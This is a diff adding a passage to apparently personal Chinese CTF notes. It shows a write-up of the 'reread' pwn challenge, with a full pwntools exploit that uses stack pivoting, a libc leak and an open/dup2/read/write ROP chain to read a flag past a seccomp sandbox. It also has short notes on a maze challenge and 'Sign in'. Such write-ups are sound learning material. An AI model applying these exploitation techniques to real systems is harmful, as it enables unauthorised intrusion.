@@ -891,7 +891,115 @@ p.interactive()
 ![[Pasted image 20241022152010.png]]
 走迷宫的算法我直接让copilot代为生成，实际采用广搜或深搜都可以，找到一条路然后将路径转为wasd保留即可。
 ### MakeHero(复现)
+
 ### reread(复现)
+IDA中查看后发现是打开了`sandbox`的，`seccomp`一下
+![[Pasted image 20241118143730.png]]
+仅允许`read,write,open,dup2`，查了一下`int dup2(int oldfd, int newfd)`可以**让传入的参数`newfd`与参数`oldfd`指向同一文件表项，让`newfd`重定向到`oldfd`所指的文件表项上，如果出错就返回-1，否则返回的就是`newfd`**。
+查看vuln，可以看到虽然是个栈溢出，但只能覆盖返回地址。
+```c
+int __usercall vuln@<eax>(__int64 a1@<rbp>)
+{
+  __int64 v2; // [rsp-48h] [rbp-48h]
+  __int64 v3; // [rsp-8h] [rbp-8h]
+
+  __asm { endbr64 }
+  v3 = a1;
+  puts(aOkLetSTryYourB);
+  read(0, &v2, 0x50uLL);
+  return puts("done!");
+}
+```
+
+思路很明显，可以构造栈迁移，之后泄露出libc基址，再构造ORW的ROP链获取flag。
+分两次栈迁移，第一次泄露出libc基址后获取`gadget`，第二次则用于构造新的`read`函数用于读入`orw`的`ROP`链，之后用`orw`链获取`flag`。
+详解跳转栈迁移部分[[栈迁移]]
+exp:
+```python
+from pwn import *
+import pwnlib.gdb
+from wstube import websocket
+
+context(os='linux', arch='amd64', log_level='debug')
+local = False
+if local:
+    p = process('./reread')
+    # pwnlib.gdb.attach(p, 'b vuln')
+else:
+    # p = remote('8.147.132.32', 16837)
+    p = websocket("wss://ctf.xidian.edu.cn/api/traffic/qAN9FDoLCgeDcyy9DchD3?port=9999")
+
+elf = ELF('./reread')
+lib = ELF('./libc.so.6')
+
+bss = elf.bss(0x100)
+log.info('bss: ' + hex(bss))
+
+vuln_read = 0x4013AC
+payload1 = b'a' * 0x40 + p64(bss) + p64(vuln_read)
+p.sendafter(b'!!\xf0\x9f\x98\x8b\n', payload1)
+p.recvuntil(b'done!\n')
+
+pop_rdi = 0x401473
+leave_ret = 0x4012ec
+bss2 = elf.bss(0x200)
+
+payload2 = p64(bss2) + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(vuln_read)
+payload2 += p64(bss - 0x28) + p64(leave_ret)
+
+# 获取puts的地址，进而获取libc的基址
+p.send(payload2.rjust(0x50, b'a'))
+p.recvuntil(b'done!\n')
+puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
+log.success('puts_addr: ' + hex(puts_addr))
+
+libc_base = puts_addr - lib.symbols['puts']
+pop_rsi = libc_base + 0x000000000002601f
+pop_rdx_r12 = libc_base + 0x0000000000119431
+pop_rax = libc_base + 0x0000000000036174
+syscall = libc_base + 0x00000000000630a9
+
+# 开辟新的bss段，用于存放ROP链，避免与前面冲突
+payload3 = b'a' * (0x40) + p64(bss2 + 0x100) + p64(vuln_read)
+p.send(payload3)
+buf = bss2 + 0x100 - 0x8 * 1
+read_addr = libc_base + lib.symbols['read']
+
+payload4 = p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(buf) + p64(pop_rdx_r12) + p64(0x200) + p64(0) + p64(read_addr)
+payload4 += p64(bss2 + 0x100 - 0x8 * 9) + p64(leave_ret)
+p.send(payload4.ljust(0x50, b'a'))
+
+# gdb.attach(p)
+# open,dup2,read,write
+payload5 = flat([
+    pop_rdi, buf,
+    pop_rsi, 0,
+    pop_rdx_r12, 0, 0,
+    pop_rax, 2,
+    syscall,
+    pop_rdi, 3,
+    pop_rsi, 0,
+    pop_rax, 33,
+    syscall,
+    pop_rdi, 0,
+    pop_rsi, elf.bss(0x20),
+    pop_rdx_r12, 0x100, 0,
+    pop_rax, 0,
+    syscall,
+    pop_rdi, 1,
+    pop_rsi, elf.bss(0x20),
+    pop_rdx_r12, 0x40, 0,
+    pop_rax, 1,
+    syscall
+])
+
+payload5 = b'./flag\x00\x00' + payload5
+p.send(payload5)
+
+p.interactive()
+```
+![[Pasted image 20241120084842.png]]
+
 ### Sign in(复现)
 看完wp有点绷不住，对战系统，赢了加分，输了扣分，敌方随机，总分达到1145以上就可以获取shell，解题方法：赢了存档，输了读档。~~游戏还是玩少了，这没想到~~
 exp:
